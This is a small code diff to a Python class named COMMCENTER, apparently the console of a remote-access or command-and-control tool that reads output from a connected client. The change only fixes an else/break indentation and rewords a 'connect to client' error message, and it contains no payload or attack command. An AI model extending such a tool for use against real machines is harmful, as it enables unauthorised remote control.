@@ -399,12 +399,12 @@ class COMMCENTER:
                         result = self.CURRENT[1].recv_data()
                         if result.strip(" "):
                             print(result)
-                    else:
-                        break
+                else:
+                    break
 
         else:
             sys.stdout.write("\n")
-            pull.error("You need to connect before execute this command")
+            pull.error("You need to connect to client before execute this command")
             sys.stdout.write("\n")
 
     def c_clear(self):
